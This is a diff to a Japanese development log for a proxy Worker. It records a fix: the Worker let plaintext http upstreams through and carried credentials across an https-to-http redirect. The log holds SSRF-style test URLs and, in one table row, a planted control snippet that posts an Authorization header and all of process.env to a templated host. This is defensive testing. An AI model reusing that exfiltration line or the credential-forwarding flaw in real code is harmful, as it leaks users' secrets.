@@ -7,6 +7,93 @@
 >
 > 大幅な変更を加えた時は **このファイルも合わせて更新** してください。
 
+## パス 345 (2026-09-20) — 配る Worker が平文 http の上流を通していた (資格情報が素のまま出る)
+
+### 見つけ方 —— 「配る Worker の防御のうち、機械が走らせているのは何本か」
+
+パス 343 / 344 で「配る物も自分の門を通す」を 2 回やったので、次は**その Worker の中**を数えた。
+Worker の関数は **9 本**。`proxyWorkerParity.test.ts` が md から切り出して**実際に走らせて**
+いるのは **2 本**だけだった (`isBlockedIp` + その依存 `expandV6`、パス 343 で足した `readCappedText`)。
+
+走っていない 7 本のうち、§3 が「**これが主たる防御線**」と呼ぶ `denyReason` を切り出して
+走らせたら、これが出た:
+
+```
+  denyReason(new URL('https://api.notion.com/v1/x'))  → null           (通す・正しい)
+  denyReason(new URL('http://api.notion.com/v1/x'))   → null           ← ⚠ 通す
+  denyReason(new URL('https://evil.example/x'))       → not in allowlist
+  denyReason(new URL('ftp://api.notion.com/x'))       → http(s) only
+```
+
+**平文 http の上流を通していた。** この Worker が上流へ送る要求には利用者の
+`Authorization` がそのまま載る (§1 の封筒がそう定義している)。
+
+### もう 1 つ —— 資格情報を落とす条件が `host` だった
+
+```js
+if (next.host !== target.host) {   // クロスホストなので資格情報を落とす
+```
+
+`host` は **scheme を含まない**。実測:
+
+```
+  target = https://api.notion.com/a
+  next   = http://api.notion.com/b
+    next.host === target.host   → true    → 資格情報を **持ち越す**
+    next.origin === target.origin → false
+```
+
+つまり**許可リスト内の上流が `302 Location: http://同じホスト/` を 1 つ返すだけで、
+利用者の Bearer が平文で流れる**。この Worker は「allowlist 済みホストが
+`302 Location: http://169.254.169.254/` を返す」形を §3 で名指ししており、
+**敵対的な上流を想定した設計**である。その想定のまま、スキームの側だけが空いていた。
+
+### 正当な用途は測って 0 件
+
+- `fetchViaProxy` の呼び出し口は **3 つ** (`web-shim.ts` の 246 / 911 / 982)。どれも
+  `shared/api/*.ts` の **https リテラル**を渡す。
+- LAN / loopback の平文は `isPrivateOrReservedTarget` が別に拒んでいるので、
+  ここに残るのは「**公開ホストへ平文**」だけ。
+- 許可リストの 10 ホストはすべて https 専用の公開 SaaS。
+
+### 直し
+
+1. `denyReason` が **https を要求**する (許可リストの後・IP 検査の前)。
+2. 資格情報の持ち越しは **origin** で判定する (同じ scheme・host・port)。
+   1 の後は平文が先に落ちるので多層防御だが、**条件として正しいのは origin** である。
+3. クライアント側 `fetchViaProxy` も https を要求する。
+   **判定の順序は「具体的な理由が先」** —— `http://127.0.0.1:8080/admin` には SSRF、
+   `http://evil.example` には「リストに無い」と答える (既存の検査の文面も動かない)。
+4. §3 に 1 項、§3.1 に残余リスク 1 項。
+
+対照 (3 つとも鳴ることを実測):
+
+```
+  Worker の https 要求を外す        → ❌ 2 件 (スキームの判定 / 見出しの行数)
+  資格情報の条件を origin → host    → ❌ 1 件
+  client の https 要求を外す        → ❌ 1 件
+```
+
+### 検証
+
+`npm test` 17,697 件 ✅ / `verify:all` 37 ゲート ✅ /
+**実機**: `perf` OK (LITE DCL 160 ms / heap 10 MB・FULL DCL 440 ms / heap 37 MB)・
+`e2e` **455 件 ❌ 0**・`e2e:lite` **455 件 ❌ 0** /
+出荷物 **11,930,858 B / 3,343,379 B (両方 +135 B)** —— client 側の枝 1 つ分。
+`renderer/network/proxy.ts` は整合性チェーンの保護対象なので `chain:append` で
+block **#243** を採掘した。
+
+### 残した物
+
+Worker の 9 本のうち機械が走らせているのは **4 本**になった
+(`isBlockedIp` / `expandV6` / `readCappedText` / `denyReason`)。
+残り 5 本 (`resolvedIpDenyReason` の DoH 経路・`timingSafeEqualStr`・`isRedirect`・
+`json`・`fetch` handler 本体) は**まだ標本を通していない**。
+`resolvedIpDenyReason` は §3.1 が「DoH 障害時は fail closed」と書いているので、
+**その主張を実際に走らせて確かめる**のが次の 1 本として自然である。
+
+---
+
 ## パス 344 (2026-09-20) — 昨日書いた法則の母集団を測ったら、まだ 4 本外に居た
 
 ### 見つけ方 —— 自分が足した法則を、自分の木に当てる
@@ -6134,6 +6221,7 @@ derivedFrom を丸ごと表にしてテストファイルに置き、
 
 | 項目 | 状態 |
 |---|---|
+| 配る Worker が平文 http の上流を通していた (パス 345) | ✅ md から `denyReason` を切り出して走らせる実測で `http://api.notion.com/v1/x` が **`null` (通す)** を返した。さらに資格情報を落とす条件が `next.host !== target.host` で、`host` は scheme を含まないため **`https://…` → `http://同じホスト` の転送で `Authorization` を持ち越していた** —— 許可リスト内の上流が `302 Location: http://` を 1 つ返すだけで利用者の Bearer が平文で流れる形。この Worker は §3 で「allowlist 済みホストが `302 Location: http://169.254.169.254/` を返す」形を名指ししており、**敵対的な上流を想定した設計のまま、スキームの側だけが空いていた**。**正当な用途は測って 0 件** (`fetchViaProxy` の呼び出し口 3 つはすべて https リテラル・LAN は別の門が拒む)。両側で https を要求し、持ち越しの判定を **origin** へ移し、パリティ検査で結んだ (対照 3 方向)。きっかけは「Worker の 9 本のうち機械が走らせているのは 2 本だけ」と数えたこと —— 今 4 本。残り 5 本のうち `resolvedIpDenyReason` の fail-closed は §3.1 が主張しているので次の候補 |
 | 配る HTML 4 本がどのゲートにも触られていなかった (パス 344) | ✅ パス 343 で足した法則 `distributed-code-same-gates` の**母集団を測ったら、まだ 4 本外に居た**。CSP を書く builder は実測 **8 本**で、`lint:artifact-csp` が CI で当たるのは `pages.yml` が publish する 4 本だけ。残り 4 本 (経営書類スタジオ / 業務自動化ダッシュボード / 就業規則メーカー / 電子定款メーカー) は**利用者がダウンロードして開く単一ファイル**で CI では 1 度も組まれず、後 2 本は tests=0 / gates=0 / workflows=0 だった。**今日は 4 本とも `document` プロファイルを通る** (実測 exit 0) —— 欠けていたのは**それを保つ物**。母集団と 8 本それぞれの合否を `artifactCspCensus.test.ts` が**門の `evaluate` を借りて**両方向に留めた (対照 2 方向)。注入口は `lint:forbidden` が `scripts/` を含めて 0 件で留めているので数えない (実測でも 4 本は `textContent` だけ)。★ 最初に書いた台帳は「同上。」で 3 行埋めており、**自分で足した「保留を置けない」規則が鳴って書き直させた** |
 | 配る Worker だけが上限の無い読みを持っていた (パス 343) | ✅ `docs/PROXY_EXAMPLE.md` の Worker (利用者が自分の Cloudflare へ貼る・**全サービスのトークンが封筒で通る**) が `await upstream.text()` を素で置いていた。実測: **64 MiB の応答で rss +223 MiB / 2,034 ms**・256 MiB で **rss +956 MiB / 6,787 ms**、上限つきなら 26〜32 ms で断り。**Workers の isolate は 128 MiB** なので 64 MiB 1 つで Worker ごと落ちる —— アプリ側の上限は**Worker が返した封筒**に掛かるので、先に落ちる限り一度も効かない。**同じファイルの 20 行上が `MAX_REDIRECTS` の理由に「無制限に追うと CPU time と subrequest 枠を使い切る」と書いていた** (資源の枯渇をホップ数の軸でだけ見ていた)。§3・§3.1 は SSRF に極めて詳しいのに大きさには 1 語も無し。`readCappedText` を足し、`MAX_UPSTREAM_BYTES` とアプリ側の `MAX_HTTP_RESPONSE_BYTES` を**md から切り出して実際に走らせるパリティ検査**で結んだ (対照 3 種)。見出しの「約 290 行」が実測 325 行だったのも機械に留めた。法則 89 本目 `distributed-code-same-gates` |
 | 37 ゲート全部が素通りする経路 (パス 342) | ✅ `lint:network-targets` は `ROOTS = ['src']` で、`scripts/` (83 ファイル) が丸ごと視界の外だった。対照: CI で走る script へ `fetch(\`https://${host}/v1/collect\`, { headers: { Authorization }, body: JSON.stringify({ env: process.env }) })` を植えると **37 ゲートすべてが exit 0**、同じコードを `src/` へ置くと鳴る —— **差は検出器ではなく走査範囲だけ**。`release.yml` の梱包ステップは署名鍵 4 本と `GH_TOKEN` を env に持つ。**直し方は「広げる」ではなかった** —— 木全体へ広げると 20 件出るが**真陽性 0 件** (全部ゲート自身の self-test の標本)、かつ `src` の外の実物 3 件は**どれも送り先が素の識別子**で `BARE_SEND` が意図して見ない (広げても 0 件見える)。第 3 の母集団として**別の検出器 + 全件台帳** (両方向・床 60・git に聞く母集団) を足し、3 件の守り (SW は送り先を作らない / 毎ホップ DNS まで見る / loopback 固定) を書いた。`SCAN_EXT` の「src はすべて TypeScript」という**循環した理由**も直した。★ **この門は法則 `scan-whole-tree` の執行者として台帳に載っていた** —— 守らせる側が自分で破っており、それを見る機械は無かった。法則 88 本目 `outside-scope-gets-its-own-census` を足した |
